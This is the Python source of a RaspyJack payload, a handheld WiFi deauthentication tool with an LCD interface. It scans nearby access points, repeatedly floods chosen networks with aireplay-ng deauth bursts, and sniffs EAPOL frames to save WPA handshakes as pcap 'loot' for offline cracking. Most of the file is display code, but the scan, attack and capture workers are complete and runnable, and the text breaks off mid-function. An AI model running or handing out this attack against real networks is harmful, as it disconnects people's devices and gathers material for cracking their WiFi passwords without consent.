#!/usr/bin/env python3
"""
RaspyJack WiFi Deauth -- Multi-Target with Handshake Capture
=============================================================
Author: 7h30th3r0n3

States: idle > scanning > select > attacking

Controls:
  IDLE:        OK=Scan  KEY3=Exit
  SCANNING:    KEY3=Cancel
  SELECT:      OK=Toggle  UP/DN=Nav  K1=Rescan  K2=Attack  LEFT/RIGHT=Mode  KEY3=Back
  ATTACKING:   KEY2=Stop  KEY3=Exit

Modes:
  DTH       -- Deauth only (aireplay-ng bursts)
  DTH+CAP   -- Deauth + parallel EAPOL sniffer (scapy)

Handshakes saved to /root/Raspyjack/loot/Handshakes/
"""

import os
import sys
import time
import signal
import subprocess
import threading
_RJ_BASE_DIR = os.environ.get("RJ_BASE_DIR") or os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import rj_theme
from PIL import Image, ImageDraw
from payloads._display_helper import scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, supports_monitor

# Optional scapy for handshake capture mode
try:
    from scapy.all import (
        Dot11, Dot11Deauth, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# WiFi integration (optional)
try:
    sys.path.append(os.path.join(_RJ_BASE_DIR, 'wifi', ''))
    from wifi.raspyjack_integration import (
        get_best_interface,
        get_available_interfaces,
        get_interface_status,
        set_raspyjack_interface,
    )
    WIFI_INTEGRATION = True
except ImportError:
    WIFI_INTEGRATION = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
SCAN_TIMEOUT_DEFAULT = 15
LOG_FILE = os.path.join(os.path.dirname(__file__), "deauth_debug.log")
LOOT_DIR = os.path.join(_RJ_BASE_DIR, 'loot', 'Handshakes')

# Attack modes
MODE_DEAUTH = 0
MODE_DEAUTH_CAPTURE = 1
MODE_LABELS = ["DTH", "DTH+CAP"]

# Colors (Obsidian Ember semantic tokens)
_T = rj_theme.EMBER_THEME
CLR_GREEN = _T["ok"]
CLR_RED = _T["danger"]
CLR_YELLOW = _T["warn"]
CLR_CYAN = _T["accent_bright"]
CLR_WHITE = _T["text_primary"]
CLR_GRAY = _T["text_muted"]
CLR_DARK = _T["bg_surface"]
CLR_BG_IDLE = _T["warn_bg"]
CLR_BG_SCAN = _T["ok_bg"]
CLR_BG_ATK = _T["danger_bg"]

# ---------------------------------------------------------------------------
# Onboard WiFi detection (keep WebUI alive)
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _detect_webui_interface():
    """Detect the onboard WebUI WiFi interface name at runtime."""
    try:
        for name in os.listdir("/sys/class/net"):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if _is_onboard_wifi_iface(name):
                return name
    except Exception:
        pass
    return "wlan0"


WEBUI_INTERFACE = _detect_webui_interface()

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def log(message):
    """Append timestamped message to log file."""
    ts = time.strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Legacy interface fallback
# ---------------------------------------------------------------------------

def _get_wifi_interface_fallback():
    """Return best WiFi interface when select_interface returns None."""
    if WIFI_INTEGRATION:
        try:
            interfaces = get_available_interfaces()
            candidates = [
                i for i in interfaces
                if i.startswith("wlan") and i != WEBUI_INTERFACE
            ]
            if candidates:
                candidates.sort(key=lambda x: (int(x[4:]) if x[4:].isdigit() else 999, x))
                return candidates[0]
        except Exception:
            pass
    return "wlan1"

# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------

def run_command(cmd, timeout=None):
    """Run shell command, return combined stdout+stderr."""
    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            preexec_fn=os.setsid,
        )
        stdout, stderr = proc.communicate(timeout=timeout)
        return stdout.decode("utf-8", errors="replace") + stderr.decode("utf-8", errors="replace")
    except Exception:
        return "Error"

# ---------------------------------------------------------------------------
# Monitor mode setup / teardown (preserved from original)
# ---------------------------------------------------------------------------

def check_interface_exists(iface):
    """Return True if the WiFi interface exists."""
    result = run_command(f"iw dev {iface} info")
    if "Interface" in result:
        return True
    # Fallback to ip link
    result = run_command(f"ip link show {iface} 2>/dev/null")
    if iface in result and "does not exist" not in result:
        return True
    return False


def setup_monitor_mode(iface):
    """Enable monitor mode on *iface*. Returns (success, mon_iface_name)."""
    log(f"Setting up monitor mode on {iface}")

    # Unmanage from NetworkManager, kill wpa_supplicant for this iface only
    run_command(f"nmcli device set {iface} managed no")
    run_command(f"pkill -f 'wpa_supplicant.*{iface}'")
    time.sleep(1)

    # Already in monitor?
    iw_info = run_command(f"iw dev {iface} info")
    if "type monitor" in iw_info:
        log(f"{iface} already in monitor mode")
        return True, iface

    # Method 1: manual iw (works with Nexmon and most drivers)
    log("Trying iw")
    run_command(f"ip link set {iface} down")
    time.sleep(0.5)
    run_command(f"iw dev {iface} set type monitor")
    time.sleep(0.5)
    run_command(f"ip link set {iface} up")
    time.sleep(1)
    chk = run_command(f"iw dev {iface} info")
    if "type monitor" in chk:
        log(f"Monitor mode on {iface} via iw")
        return True, iface

    # Method 2: airmon-ng fallback
    log("Trying airmon-ng")
    run_command(f"airmon-ng start {iface}")
    for candidate in [f"{iface}mon", iface]:
        chk = run_command(f"iw dev {candidate} info")
        if "type monitor" in chk:
            log(f"Monitor mode on {candidate} via airmon-ng")
            return True, candidate

    log("Failed to enable monitor mode")
    return False, iface


def validate_setup(iface):
    """Full pre-flight: interface exists, tools present, monitor mode."""
    if not check_interface_exists(iface):
        draw_status(f"{iface} not found!", CLR_RED)
        time.sleep(2)
        return False, iface

    for tool in ("aireplay-ng", "airodump-ng"):
        if tool not in run_command(f"which {tool}"):
            draw_status(f"Missing: {tool}", CLR_RED)
            time.sleep(2)
            return False, iface

    # Check monitor mode capability
    if not supports_monitor(iface):
        draw_status(f"{iface} no monitor mode!\nNeed compatible card", CLR_RED)
        time.sleep(3)
        return False, iface

    draw_status(f"Monitor mode: {iface}...")
    ok, mon = setup_monitor_mode(iface)
    if not ok:
        draw_status(f"Monitor mode failed\non {iface}", CLR_RED)
        time.sleep(2)
    return ok, mon

# ---------------------------------------------------------------------------
# Scanning
# ---------------------------------------------------------------------------

def scan_networks(iface, timeout_sec):
    """Run airodump-ng and parse CSV. Returns list of network dicts."""
    log(f"Scanning on {iface}, timeout {timeout_sec}s")
    subprocess.run("rm -f /tmp/deauth_scan*", shell=True)
    cmd = (
        f"timeout {timeout_sec} airodump-ng --band abg "
        f"--output-format csv -w /tmp/deauth_scan {iface}"
    )
    subprocess.run(cmd, shell=True, capture_output=True, text=True)

    nets = []
    clients_per_bssid = {}

    try:
        with open("/tmp/deauth_scan-01.csv", "r") as f:
            content = f.read()
    except Exception as exc:
        log(f"Cannot read scan CSV: {exc}")
        return nets

    # Split AP section from Station section
    parts = content.split("Station MAC")
    ap_section = parts[0]
    station_section = parts[1] if len(parts) > 1 else ""

    # Count clients per BSSID from station section
    for line in station_section.strip().split("\n"):
        cols = line.split(",")
        if len(cols) >= 6:
            bssid = cols[5].strip() if len(cols) > 5 else ""
            if ":" in bssid:
                clients_per_bssid[bssid] = clients_per_bssid.get(bssid, 0) + 1

    # Parse AP section
    header_found = False
    col_map = {}
    for line in ap_section.strip().split("\n"):
        if "BSSID" in line and "ESSID" in line:
            headers = [h.strip() for h in line.split(",")]
            for i, h in enumerate(headers):
                col_map[h.upper()] = i
            header_found = True
            continue
        if not header_found:
            continue

        cols = line.split(",")
        bssid_i = col_map.get("BSSID", -1)
        essid_i = col_map.get("ESSID", -1)
        ch_i = col_map.get("CHANNEL", -1)
        pwr_i = col_map.get("POWER", -1)

        if bssid_i < 0 or essid_i < 0:
            continue
        if len(cols) <= essid_i:
            continue

        bssid = cols[bssid_i].strip()
        # ESSID is last column and may contain commas — rejoin everything from essid_i
        essid = ",".join(cols[essid_i:]).strip().strip('"')
        # Remove trailing "Key" column if present
        if essid.endswith(","):
            essid = essid[:-1].strip()
        channel = cols[ch_i].strip() if ch_i >= 0 and ch_i < len(cols) else "?"
        power_raw = cols[pwr_i].strip() if pwr_i >= 0 and pwr_i < len(cols) else "-99"

        if not essid or not bssid or ":" not in bssid:
            continue

        # Parse power to int
        try:
            power = int(power_raw)
        except ValueError:
            power = -99

        num_clients = clients_per_bssid.get(bssid, 0)

        nets.append({
            "essid": essid,
            "bssid": bssid,
            "channel": channel,
            "power": power,
            "clients": num_clients,
        })

    # Sort by signal strength (strongest first)
    nets.sort(key=lambda n: n["power"], reverse=True)
    log(f"Found {len(nets)} networks")
    return nets

# ---------------------------------------------------------------------------
# Signal strength helpers
# ---------------------------------------------------------------------------

def _signal_bars(power_dbm):
    """Return 1-4 bar string based on dBm value."""
    if power_dbm >= -50:
        return "||||"
    if power_dbm >= -60:
        return "||| "
    if power_dbm >= -70:
        return "||  "
    if power_dbm >= -80:
        return "|   "
    return ".   "


def _signal_color(power_dbm):
    """Return color for signal strength."""
    if power_dbm >= -50:
        return CLR_GREEN
    if power_dbm >= -65:
        return CLR_YELLOW
    return CLR_RED

# ---------------------------------------------------------------------------
# Attack logic (preserved from original)
# ---------------------------------------------------------------------------

def start_attack_worker(targets, iface, stop_event, stats):
    """Worker thread: aggressive triple deauth on all targets.

    *stats* is a dict mutated in-place: {packets, clients, eapol, hs_captured, hs_ssid}.
    """
    log(f"Attack worker started, {len(targets)} targets")

    # Adaptive timing: more targets = less time per target
    n = len(targets)
    burst_pkts = 16 if n > 3 else 32 if n > 1 else 64
    burst_count = max(1, 3 // n) if n > 0 else 3
    cycle_pause = max(0.5, 2 - n * 0.5)

    while not stop_event.is_set():
        for target in targets:
            if stop_event.is_set():
                break
            ch = target["channel"]
            if ch == "?" or not ch.strip().isdigit():
                continue

            bssid = target["bssid"]

            # Set channel (with timeout to avoid hang)
            run_command(f"iw dev {iface} set channel {ch}", timeout=3)
            time.sleep(0.2)
            if stop_event.is_set():
                break

            # Quick burst deauth per target (strict timeout to avoid blocking)
            for burst in range(burst_count):
                if stop_event.is_set():
                    break
                cmd = f"timeout 5 aireplay-ng -0 {burst_pkts} -a {bssid} {iface}"
                result = run_command(cmd, timeout=8)
                if "Error" not in result:
                    stats["packets"] += burst_pkts
                time.sleep(0.1)

            if stop_event.is_set():
                break

            # Minimal pause between targets
            if stop_event.wait(0.3):
                break

        # Brief pause between full cycles
        if stop_event.wait(cycle_pause):
            break

    log("Attack worker stopped")


def start_capture_worker(targets, iface, stop_event, stats):
    """Worker thread: sniff EAPOL frames in parallel with deauth.

    When 4+ EAPOL messages captured for a MAC pair, save pcap.
    Mutates *stats* in-place.
    """
    if not SCAPY_OK:
        log("Scapy not available -- capture worker disabled")
        return

    eapol_msgs = {}   # (mac_a, mac_b) -> [pkt, ...]
    beacons = {}      # bssid -> beacon pkt (one per AP)
    target_bssids = {t["bssid"].upper() for t in targets}

    def _handle(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11):
            return

        # Capture beacon frames from target APs (needed by aircrack for ESSID)
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon
            bssid = (pkt[Dot11].addr3 or "").upper()
            if bssid in target_bssids and bssid not in beacons:
                beacons[bssid] = pkt

        if not pkt.haslayer(EAPOL):
            return
        stats["eapol"] += 1
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))
        if pair not in eapol_msgs:
            eapol_msgs[pair] = []
        eapol_msgs[pair].append(pkt)

        # Check for complete handshake
        if len(eapol_msgs[pair]) >= 4 and not stats.get("_saved_" + str(pair)):
            stats["_saved_" + str(pair)] = True
            stats["hs_captured"] += 1
            essid = "unknown"
            # Determine SSID from targets
            for t in targets:
                if t["bssid"].upper() in pair:
                    essid = t["essid"]
                    break
            stats["hs_ssid"] = essid
            # Include beacon in saved pcap so aircrack can read the ESSID
            save_pkts = []
            for bssid in pair:
                if bssid in beacons:
                    save_pkts.append(beacons[bssid])
            save_pkts.extend(eapol_msgs[pair])
            _save_handshake(save_pkts, essid)

    def _sniff_loop():
        while not stop_event.is_set():
            try:
                scapy_sniff(
                    iface=iface, prn=_handle, timeout=10, store=False,
                    stop_filter=lambda _: stop_event.is_set(),
                )
            except Exception as exc:
                log(f"Sniffer error: {exc}")
                if not stop_event.is_set():
                    time.sleep(1)

    sniff_t = threading.Thread(target=_sniff_loop, daemon=True)
    sniff_t.start()
    log("Capture worker started")


def _save_handshake(packets, essid):
    """Write EAPOL packets to a .pcap in loot directory."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in essid)
    ts = time.strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"hs_{safe}_{ts}.pcap")
    try:
        wrpcap(path, packets)
        log(f"Handshake saved: {path}")
    except Exception as exc:
        log(f"Failed to save handshake: {exc}")

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------

def stop_all(stop_event, threads, iface):
    """Signal stop, kill leftover processes, wait for threads."""
    stop_event.set()
    run_command("pkill -f aireplay-ng 2>/dev/null || true")
    run_command("pkill -f airodump-ng 2>/dev/null || true")
    for t in threads:
        if t.is_alive():
            t.join(timeout=3)
    run_command(f"nmcli device set {iface} managed yes 2>/dev/null || true")
    log("Cleanup done")

# ---------------------------------------------------------------------------
# LCD setup
# ---------------------------------------------------------------------------

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height

canvas = Image.new("RGB", (WIDTH, HEIGHT), _T["bg_base"])
draw = ImageDraw.Draw(canvas)

# Resolution-adaptive Obsidian Ember fonts
FONTS = rj_theme.load_app_fonts(WIDTH, HEIGHT)
FNT_LG = FONTS["title"]
FNT_MD = FONTS["body_bold"]
FNT_SM = FONTS["body"]
FNT_XS = FONTS["sub"]

# ---------------------------------------------------------------------------
# Interface selection
# ---------------------------------------------------------------------------

WIFI_INTERFACE = select_interface(LCD, scaled_font(), PINS, GPIO, iface_type="wifi")
if not WIFI_INTERFACE:
    WIFI_INTERFACE = _get_wifi_interface_fallback()

# ---------------------------------------------------------------------------
# Drawing helpers (native resolution-adaptive Obsidian Ember)
# ---------------------------------------------------------------------------

def _dbm_to_pct(power_dbm):
    try:
        val = int(power_dbm)
    except Exception:
        val = -99
    return max(0, min(100, int((val + 95) * 100 / 55)))


def _header(text, color, bg, badge="", right_text="", right_pill=""):
    """Obsidian Ember header bar at top."""
    return rj_theme.draw_app_header(
        draw, WIDTH, text, FONTS,
        badge=badge, right_text=right_text, right_pill=right_pill,
    )


def _footer(text, right_text=""):
    """Obsidian Ember footer bar at bottom."""
    return rj_theme.draw_app_footer(draw, WIDTH, HEIGHT, text, FONTS, right_text=right_text)


def _fmt_time(seconds):
    m = int(seconds) // 60
    s = int(seconds) % 60
    return f"{m:02d}:{s:02d}"


def _refresh():
    LCD.LCD_ShowImage(canvas, 0, 0)

# ---------------------------------------------------------------------------
# Screen: IDLE
# ---------------------------------------------------------------------------

def draw_idle(iface, timeout, mode):
    wide = FONTS["wide"]
    large = FONTS["large"]
    draw.rectangle((0, 0, WIDTH - 1, HEIGHT - 1), fill=_T["bg_base"])
    hdr_h = _header(
        "WIFI DEAUTH", CLR_YELLOW, CLR_BG_IDLE,
        badge="IDLE", right_text=iface if wide else "", right_pill=MODE_LABELS[mode],
    )
    ftr_h = _footer(
        "OK/Enter:Scan  L/R:Mode  Up/Dn:Time  K3/Esc:Exit" if wide else "OK:Scan L/R:Mode K3:X",
        right_text=iface if large else "",
    )
    pad = 10 if large else (6 if wide else 4)
    y0 = hdr_h + pad
    y1 = HEIGHT - ftr_h - pad

    if WIDTH >= 480:
        # Two-column layout: Configuration card (left) + Controls card (right)
        mid = int(WIDTH * 0.54)
        rj_theme.draw_card(
            draw, (pad, y0, mid - pad // 2, y1),
            fill=_T["bg_surface"], outline=_T["border_subtle"],
            radius=8, accent_left=_T["accent"], accent_width=4,
        )
        lx = pad + 14
        ly = y0 + 12
        draw.text((lx, ly), "CONFIGURATION", font=FONTS["badge"], fill=_T["accent_bright"])
        ly += 22
        rows = [
            ("Interface", iface, _T["text_bright"]),
            ("Scan Window", f"{timeout} seconds", _T["warn"]),
            ("Attack Mode", "Deauth + EAPOL Capture" if mode == MODE_DEAUTH_CAPTURE else "Deauth Burst Only", _T["accent_bright"]),
            ("Scapy Engine", "Ready" if SCAPY_OK else "Missing (install scapy)", _T["ok"] if SCAPY_OK else _T["danger"]),
        ]
        for label, val, col in rows:
            draw.text((lx, ly), label, font=FONTS["sub"], fill=_T["text_muted"])
            ly += 15
            draw.text((lx, ly), rj_theme.truncate_text(draw, val, mid - lx - 16, FONTS["body_bold"]), font=FONTS["body_bold"], fill=col)
            ly += 24

        rx0 = mid + pad // 2
        rj_theme.draw_card(
            draw, (rx0, y0, WIDTH - pad, y1),
            fill=_T["bg_surface"], outline=_T["border_subtle"],
            radius=8, accent_left=_T["ok"], accent_width=4,
        )
        rx = rx0 + 14
        ry = y0 + 12
        draw.text((rx, ry), "CONTROLS", font=FONTS["badge"], fill=_T["ok"])
        ry += 24
        ctrls = [
            ("OK / Enter", "Start AP scan", _T["ok"]),
            ("LEFT / RIGHT", "Toggle DTH / DTH+CAP", _T["accent_bright"]),
            ("UP / DOWN", "Scan timeout +/- 5s", _T["text_primary"]),
            ("KEY3 / Esc", "Exit payload", _T["danger"]),
        ]
        for key_txt, desc, col in ctrls:
            pw, _ = rj_theme.draw_pill(
                draw, rx, ry, key_txt, FONTS["badge"],
                bg=_T["bg_elevated"], fg=col, outline=_T["border_subtle"], pad_x=6, pad_y=2,
            )
            draw.text((rx + pw + 8, ry + 2), rj_theme.truncate_text(draw, desc, WIDTH - pad - rx - pw - 14, FONTS["body"]), font=FONTS["body"], fill=_T["text_primary"])
            ry += 30
    else:
        rj_theme.draw_card(
            draw, (pad, y0, WIDTH - pad, y1),
            fill=_T["bg_surface"], outline=_T["border_subtle"],
            radius=6 if wide else 4, accent_left=_T["accent"], accent_width=3 if wide else 2,
        )
        tx = pad + (10 if wide else 6)
        max_w = WIDTH - pad - tx - 4
        y = y0 + (6 if wide else 4)
        step = 18 if wide else (16 if HEIGHT >= 200 else 11)
        draw.text((tx, y), rj_theme.truncate_text(draw, f"Iface: {iface}", max_w, FONTS["body_bold"]), font=FONTS["body_bold"], fill=_T["text_bright"])
        y += step
        draw.text((tx, y), f"Timeout: {timeout}s   Mode: {MODE_LABELS[mode]}" if wide else f"Time:{timeout}s  {MODE_LABELS[mode]}", font=FONTS["body"], fill=_T["accent_bright"])
        y += step
        if mode == MODE_DEAUTH_CAPTURE and not SCAPY_OK:
            draw.text((tx, y), "scapy missing!", font=FONTS["sub"], fill=_T["danger"])
            y += step - 2
        if y + step * 2 <= y1:
            draw.line([(tx, y), (WIDTH - pad - 6, y)], fill=_T["border_subtle"])
            y += 5 if wide else 3
            draw.text((tx, y), "OK: Scan networks" if wide else "OK   Scan APs", font=FONTS["sub"], fill=_T["ok"])
            y += step - 2
            if y + 10 <= y1:
                draw.text((tx, y), "L/R: Mode   U/D: Timeout +/-5s" if wide else "L/R:Mode U/D:+/-5s", font=FONTS["sub"], fill=_T["text_muted"])
                y += step - 2
            if y + 10 <= y1:
                draw.text((tx, y), "K3/Esc: Exit", font=FONTS["sub"], fill=_T["danger"])
    _refresh()

# ---------------------------------------------------------------------------
# Screen: SCANNING (animated)
# ---------------------------------------------------------------------------

def draw_scanning(elapsed, timeout):
    wide = FONTS["wide"]
    large = FONTS["large"]
    dots = "." * (int(elapsed * 2) % 4)
    draw.rectangle((0, 0, WIDTH - 1, HEIGHT - 1), fill=_T["bg_base"])
    hdr_h = _header("WIFI DEAUTH", CLR_GREEN, CLR_BG_SCAN, badge="SCAN", right_text=f"{timeout}s window")
    ftr_h = _footer("KEY3 / Esc: Cancel scan" if wide else "K3: Cancel")

    pad = 16 if large else (10 if wide else 6)
    cw = min(WIDTH - pad * 2, 420 if large else (280 if wide else WIDTH - 10))
    ch = 132 if large else (86 if wide else 68)
    cx0 = (WIDTH - cw) // 2
    cy0 = hdr_h + max(4, (HEIGHT - hdr_h - ftr_h - ch) // 2)
    rj_theme.draw_card(
        draw, (cx0, cy0, cx0 + cw, cy0 + ch),
        fill=_T["bg_surface"], outline=_T["border_accent"],
        radius=8 if wide else 4, accent_left=_T["ok"], accent_width=4 if wide else 2,
    )
    tx = cx0 + (16 if wide else 8)
    remaining = max(0, timeout - int(elapsed))
    pct = min(1.0, elapsed / timeout) if timeout > 0 else 0.0
    draw.text((tx, cy0 + (16 if large else 10)), f"Scanning 2.4 / 5 GHz{dots}" if wide else f"Scanning{dots}", font=FONTS["title"], fill=_T["ok"])
    draw.text((tx, cy0 + (46 if large else (30 if wide else 24))), f"{remaining}s remaining  ({int(pct * 100)}%)", font=FONTS["body"], fill=_T["text_primary"])
    bar_y = cy0 + (82 if large else (54 if wide else 44))
    bar_h = 14 if large else (10 if wide else 8)
    rj_theme.draw_progress_bar(
        draw, (tx, bar_y, cx0 + cw - (16 if wide else 8), bar_y + bar_h),
        pct, fill=_T["accent"], track=_T["bg_well"], outline=_T["border_subtle"], radius=4 if wide else 2,
    )
    _refresh()

# ---------------------------------------------------------------------------
# Screen: SELECT (network list)
# ---------------------------------------------------------------------------

def draw_select(nets, idx, targets, mode):
    wide = FONTS["wide"]
    large = FONTS["large"]
    target_bssids = {t["bssid"] for t in targets}
    draw.rectangle((0, 0, WIDTH - 1, HEIGHT - 1), fill=_T["bg_base"])
    hdr_h = _header(
        "SELECT TARGETS", CLR_GREEN, CLR_BG_SCAN,
        badge=f"{len(targets)} SEL",
        right_text=f"{len(nets)} APs",
        right_pill=MODE_LABELS[mode],
    )
    ftr_h = _footer(
        "Up/Dn:Nav  OK:Toggle  K1:Rescan  K2:Attack  L/R:Mode  K3:Back" if wide else f"{len(targets)}sel {MODE_LABELS[mode]} K1:Sc K2:Go",
        right_text=f"{idx + 1}/{max(1, len(nets))}" if large else "",
    )

    pad = 8 if large else (4 if wide else 2)
    y_top = hdr_h + pad
    y_bot = HEIGHT - ftr_h - pad
    avail_h = max(20, y_bot - y_top)

    split = WIDTH >= 480
    list_x0 = pad
    list_x1 = int(WIDTH * 0.64) - pad // 2 if split else WIDTH - pad - (6 if len(nets) > 5 else 0)
    list_w = list_x1 - list_x0

    row_h = 28 if large else (22 if wide else (20 if HEIGHT >= 200 else 13))
    rows = max(1, avail_h // row_h)
    scroll = max(0, idx - rows // 2)
    scroll = min(scroll, max(0, len(nets) - rows))

    for i in range(rows):
        ni = scroll + i
        if ni >= len(nets):
            break
        net = nets[ni]
        y = y_top + i * row_h
        is_cur = ni == idx
        is_sel = net["bssid"] in target_bssids

        if is_cur:
            rj_theme.draw_card(
                draw, (list_x0, y, list_x1, y + row_h - 2),
                fill=_T["select_bg"], outline=_T["border_accent"],
                radius=4 if wide else 2, accent_left=_T["accent"], accent_width=3 if wide else 2,
            )
        elif i % 2 == 1 and wide:
            draw.rectangle((list_x0, y, list_x1, y + row_h - 2), fill=_T["bg_surface"])

        text_y = y + max(1, (row_h - (15 if large else (11 if wide else 9))) // 2)
        chk_x = list_x0 + (8 if wide else 3)
        chk = "[x]" if is_sel else "[ ]"
        chk_clr = _T["ok"] if is_sel else _T["text_dim"]
        draw.text((chk_x, text_y), chk, font=FONTS["mono"] if wide else FONTS["sub"], fill=chk_clr)

        # Right-side telemetry columns (clients, signal bars, channel)
        rx = list_x1 - (8 if wide else 3)
        if net["clients"] > 0:
            cli_txt = f"{net['clients']}c"
            cw_px = rj_theme.measure_text(FONTS["badge"], cli_txt, draw)[2] + (8 if wide else 2)
            if wide:
                pw, _ = rj_theme.draw_pill(
                    draw, rx - cw_px, y + max(1, (row_h - 15) // 2),
                    cli_txt, FONTS["badge"], bg=_T["warn_bg"], fg=_T["warn"], outline=None, pad_x=4, pad_y=1,
                )
                rx -= pw + 5
            else:
                draw.text((rx - cw_px + 2, text_y), cli_txt, font=FONTS["sub"], fill=_T["warn"])
                rx -= cw_px + 2

        sig_h = 12 if large else (10 if wide else 8)
        sig_w = max(12, (sig_h // 5) * 4 + 8)
        sig_col = _signal_color(net["power"])
        rj_theme.draw_signal_bars(
            draw, rx - sig_w, y + max(1, (row_h - sig_h) // 2),
            sig_h, _dbm_to_pct(net["power"]), active_color=sig_col,
        )
        rx -= sig_w + (6 if wide else 3)

        if wide:
            dbm_txt = f"{net['power']}dB"
            dw = rj_theme.measure_text(FONTS["sub"], dbm_txt, draw)[2]
            draw.text((rx - dw, text_y + 1), dbm_txt, font=FONTS["sub"], fill=_T["text_muted"])
            rx -= dw + 6

        ch_txt = f"CH{net['channel']}" if wide else f"c{net['channel']}"
        ch_w = rj_theme.measure_text(FONTS["badge"], ch_txt, draw)[2] + (8 if wide else 2)
        if wide:
            pw, _ = rj_theme.draw_pill(
                draw, rx - ch_w, y + max(1, (row_h - 15) // 2),
                ch_txt, FONTS["badge"], bg=_T["bg_elevated"], fg=_T["accent_bright"], outline=None, pad_x=4, pad_y=1,
            )
            rx -= pw + 6
        else:
            draw.text((rx - ch_w, text_y), ch_txt, font=FONTS["sub"], fill=_T["accent_bright"])
            rx -= ch_w + 3

        ssid_x = chk_x + (28 if large else (22 if wide else 15))
        ssid_max = max(24, rx - ssid_x - 2)
        ssid_fnt = FONTS["body_bold"] if (is_cur and wide) else (FONTS["body"] if wide else FONTS["sub"])
        name_clr = _T["text_bright"] if is_cur else (_T["ok"] if is_sel else _T["text_primary"])
        draw.text((ssid_x, text_y), rj_theme.truncate_text(draw, net["essid"], ssid_max, ssid_fnt), font=ssid_fnt, fill=name_clr)

    if len(nets) > rows:
        sb_x = list_x1 + 2 if split else WIDTH - 5
        rj_theme.draw_scrollbar(draw, sb_x, y_top, y_bot, scroll, rows, len(nets), width=3)

    # Split-pane right detail card on HDMI / wide screens (W >= 480)
    if split and nets and 0 <= idx < len(nets):
        cur = nets[idx]
        px0 = list_x1 + 10
        rj_theme.draw_card(
            draw, (px0, y_top, WIDTH - pad, y_bot),
            fill=_T["bg_surface"], outline=_T["border_subtle"],
            radius=8, accent_left=_T["ok"] if cur["bssid"] in target_bssids else _T["accent"], accent_width=4,
        )
        dx = px0 + 12
        dy = y_top + 10
        dw_max = WIDTH - pad - dx - 8
        draw.text((dx, dy), "AP INSPECTOR", font=FONTS["badge"], fill=_T["accent_bright"])
        dy += 20
        draw.text((dx, dy), rj_theme.truncate_text(draw, cur["essid"], dw_max, FONTS["title"]), font=FONTS["title"], fill=_T["text_bright"])
        dy += 22
        draw.text((dx, dy), cur["bssid"], font=FONTS["mono"], fill=_T["text_muted"])
        dy += 22
        draw.line([(dx, dy), (WIDTH - pad - 10, dy)], fill=_T["border_subtle"])
        dy += 10
        meta_rows = [
            ("Channel", f"Ch {cur['channel']}", _T["accent_bright"]),
            ("Signal", f"{cur['power']} dBm", _signal_color(cur["power"])),
            ("Clients", str(cur["clients"]), _T["warn"] if cur["clients"] else _T["text_muted"]),
            ("Queued", "YES (targeted)" if cur["bssid"] in target_bssids else "No (OK to select)", _T["ok"] if cur["bssid"] in target_bssids else _T["text_muted"]),
            ("Mode", MODE_LABELS[mode], _T["accent_bright"]),
        ]
        for k, v, col in meta_rows:
            draw.text((dx, dy), f"{k}:", font=FONTS["sub"], fill=_T["text_muted"])
            draw.text((dx + 68, dy), rj_theme.truncate_text(draw, v, dw_max - 68, FONTS["body_bold"]), font=FONTS["body_bold"], fill=col)
            dy += 22
        if dy + 22 <= y_bot:
            rj_theme.draw_pill(
                draw, dx, y_bot - 28,
                f"K2 LAUNCH ({len(targets)})" if targets else "SELECT AP WITH OK",
                FONTS["badge"],
                bg=_T["danger_bg"] if targets else _T["bg_elevated"],
                fg=_T["danger"] if targets else _T["text_muted"],
                outline=_T["danger"] if targets else _T["border_subtle"],
                pad_x=8, pad_y=3,
            )

    _refresh()

# ---------------------------------------------------------------------------
# Screen: ATTACKING (dashboard)
# ---------------------------------------------------------------------------

def draw_attack_dashboard(targets, stats, elapsed, mode, hs_flash_until):
    wide = FONTS["wide"]
    large = FONTS["large"]
    now = time.time()
    flashing = hs_flash_until > now

    draw.rectangle((0, 0, WIDTH - 1, HEIGHT - 1), fill=_T["bg_base"])
    hdr_h = _header(
        "DEAUTH ATTACK", CLR_RED, CLR_BG_ATK,
        badge="HS CAPTURED" if flashing else "LIVE",
        right_text=_fmt_time(elapsed),
        right_pill=MODE_LABELS[mode],
    )
    ftr_h = _footer(
        "KEY2: Stop Attack   KEY3 / Esc: Exit" if wide else "K2:Stop  K3:Exit",
        right_text=f"{len(targets)} targets" if large else "",
    )

    if flashing:
